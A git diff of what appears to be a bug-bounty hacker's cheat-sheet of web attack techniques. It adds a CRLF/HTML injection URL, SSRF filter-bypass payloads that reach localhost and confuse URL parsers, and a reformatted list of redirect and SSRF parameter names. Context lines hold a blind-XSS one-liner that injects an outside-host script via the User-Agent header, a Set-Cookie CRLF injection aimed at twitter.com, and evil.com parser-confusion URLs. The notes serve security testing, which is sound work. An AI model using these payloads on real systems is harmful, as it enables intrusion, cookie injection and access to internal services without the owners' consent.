@@ -562,6 +562,8 @@ Override path
 -------------------------------------------------------------------------------------------------
 CRLF
 1- /login?redirect_after_login=/jjjkkk嘊嘍Set-Cookie:jjjjj=a;domain=twitter.com	=> crlf
+2- https://example.com/out/?to=https://www.google.com/%00%0D%0A%0D%0A<h1>hossam</h1>
+
 
 ---------------------------------------------------------------------------------------------------
 Open Redirect
@@ -622,6 +624,11 @@ places of session files
 
 ---------------------------------------------------------------------------------------------------
 Broken Links
+broken links 
+blc -rof --filter-level 3 https://example.com/
+https://ahrefs.com/broken-link-checker	online checker
+https://www.deadlinkchecker.com/ 	online checker
+https://brokenlinkcheck.com/ 		online checker
 
 
 
@@ -675,7 +682,7 @@ inurl:"contact-form"
 3- cat domain.txt | waybackurls | httpx -H "User-Agent: \"><script src=https://chirag.bxss.in></script>"
 
 -----------------------------------------------------------------------------------------------------------------------------------------------
-Signup
+Signup- registeration
 1- create account with username or email address 	aa@gmail.com => password => 123
 	- create second account with aa@gmail.com => password xyz	=> or use 	a.a@gmail.com	=>  AA@gmail.com => Aa@gamil.com => aA@gmail.com
 	- see if you can't login to first account with password 123 then bug (prevent any user )	=> https://hackerone.com/reports/187714
@@ -702,6 +709,7 @@ Signup
 7- if you can see username in url then try to but username with file names as index.php , singup.php , signup , signin.php, login.php	example.com/username	=> path override
 8- check if you can use password 1234 or weak password (weak password policy)
 9- try to make hossam@company.tld account to access unauthorized  places with their account
+10- 
 
 ------------------------------------------------------------------------------------------------------
 Login 
@@ -745,98 +753,12 @@ Host: example.com
 -----------------------------------------------------------------------------------------------------
 SSRF 
 uri=
-logout_redirect_uri=
-url=
-page=
-proxy=
-fwd=
-forward=
-u=
-data=
-page=
-url=	
-ret=	
-r2=	
-img=	
-u	
-return	
-r	
-URL	
-next	
-redirect	
-redirectBack	
-AuthState	
-referer	
-redir	
-l	
-aspxerrorpath	
-image_path	
-ActionCodeURL	
-return_url	0
-link	
-q	
-location	
-ReturnUrl	
-uri	
-referrer	
-returnUrl
-forward	
-file
-rb	
-end_display	
-urlact	
-from	
-goto	
-path	
-redirect_url	
-old	
-pathlocation	
-successTarget	
-returnURL	
-urlsito	
-newurl	
-Url	
-back	
-retour	
-odkazujuca
-r_link	
-cur_url	
-H_name	
-ref	
-topic	
-resource	
-returnTo	
-home	0.2%
-node	0.2%
-sUrl	0.2%
-href	0.2%
-linkurl	0.2%
-returnto	0.2%
-redirecturl	0.2%
-SL	0.2%
-st	0.2%
-errorUrl	0.2%
-media	0.2%
-destination	0.2%
-targeturl	0.2%
-return_to	0.2%
-cancel_url	0.2%
-doc	0.2%
-GO	0.2%
-ReturnTo	0.2%
-anything	0.2%
-FileName	0.2%
-logoutRedirectURL	0.2%
-list	0.2%
-startUrl	0.2%
-service	0.2%
-redirect_to	0.2%
-end_url	0.2%
-_next	0.2%
-noSuchEntryRedirect	0.2%
-context	0.2%
-returnurl	0.2%
-ref_url	
+	logout_redirect_uri= , url= ,page= , proxy= ,fwd= , forward= ,u= ,data= , page= url=,  ret=, r2=,img=,u=,return=,r, URL,next,	
+	redirect,redirectBack,AuthState,referer	,redir,l, aspxerrorpath,image_path,ActionCodeURL,return_url,link,q,location, ReturnUrl,uri	
+	referrer,returnUrl,forward,file,rb,end_display,urlact,from,goto	,path,redirect_url,old,pathlocation,successTarget,returnURL,urlsito	
+	newurl,Url,back	,retour	,odkazujuca,r_link,cur_url,H_name,ref,topic,resource,returnTo,home,node	,sUrl,href,linkurl,returnto	
+	redirecturl,SL,st,errorUrl,media,destination,targeturl,return_to,cancel_url,doc	,GO,ReturnTo,anything,FileName,logoutRedirectURL,list,startUrl,service	
+	redirect_to,end_url,_next,noSuchEntryRedirect,context,returnurl	,ref_url	
 
 - PAYLOADS 
 	http://127.0.0.1:port
@@ -875,12 +797,22 @@ ref_url
 	requests + browsers : 2.2.2.2
 	urllib : 3.3.3.3
 	http://ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ = example.com
+	?url=https://ⓈⒾⓉⒺ.ⓒⓞⓜ = site.com
 	① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿
 	0://evil.com:80;http://google.com:80/
 	http://127.1.1.1:80\@127.2.2.2:80/
 	http://127.1.1.1:80\@@127.2.2.2:80/
 	http://127.1.1.1:80:\@@127.2.2.2:80/
 	http://127.1.1.1:80#\@127.2.2.2:80/
+	?url=http://localhost:8000/status/
+	?url=http://safesite.com&site.com
+	?url=http://////////////site.com/
+	?url=http://site@com/account/edit.aspx
+	?url=http://site.com/account/edit.aspx
+	?url=http://safesite.com?.site.com
+	?url=http://safesite.com#.site.com
+	?url=http://safesite.com\.site.com/domain
+
 	
 - AWS 
 	http://instance-data
